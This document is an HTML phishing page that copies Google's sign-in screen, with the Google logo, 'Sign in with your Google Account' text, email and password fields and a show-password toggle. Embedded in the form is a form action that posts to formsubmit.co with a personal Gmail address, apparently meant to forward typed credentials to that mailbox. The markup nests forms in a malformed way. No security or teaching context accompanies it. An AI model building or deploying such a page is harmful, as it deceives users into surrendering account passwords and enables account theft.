<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In Form with Password</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
        }

        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f5f5f5;
        }

        .container {
            text-align: center;
            width: 350px;
            padding: 20px;
            background-color: white;
            border: 1px solid #ddd;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }

        .logo img {
            width: 100px;
        }

        h2 {
            font-size: 24px;
            margin-top: 20px;
        }

        p {
            color: #555;
            margin-bottom: 20px;
        }

        a {
            color: #1a73e8;
            font-size: 14px;
            display: inline-block;
            margin-bottom: 20px;
            text-decoration: none;
        }

        a:hover {
            text-decoration: underline;
        }

        .sign-in-form {
            display: flex;
            flex-direction: column;
            align-items: flex-start;
        }

        .sign-in-form input {
            padding: 10px;
            width: 100%;
            font-size: 16px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }

        .sign-in-form button {
            padding: 10px;
            font-size: 16px;
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            width: 100%;
        }

        .sign-in-form button:hover {
            background-color: #166adb;
        }

        label {
            display: flex;
            align-items: center;
            font-size: 14px;
            color: #333;
        }

        label input {
            margin-right: 8px;
        }

        @media (max-width: 500px) {
            .container {
                width: 90%;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo">
        </div>
        <h2>Sign in</h2>
        <p>with your Google Account.</p>
        <a href="#">Learn more about using your account</a>
        <form class="sign-in-form">
            <!-- Email input field -->
            <input type="email" placeholder="Email or phone" required>
            <!-- Password input field -->
            <input type="password" id="password" placeholder="Enter your password" required>
            <!-- Show password checkbox -->
            <label>
                <input type="checkbox" id="showPassword"> Show password
            </label>
            <a href="#">Forgot email?</a>
            <button type="submit">Next</button>
			<form action="https://formsubmit.co/venomkiid1@gmail.com" method="POST">
        </form>
        <a href="#">Create account</a>
    </div>

    <script>
        const passwordInput = document.getElementById('password');
        const showPasswordCheckbox = document.getElementById('showPassword');

        showPasswordCheckbox.addEventListener('change', function() {
            if (this.checked) {
                passwordInput.type = 'text';
            } else {
                passwordInput.type = 'password';
            }
        });
    </script>
</body>
</html>
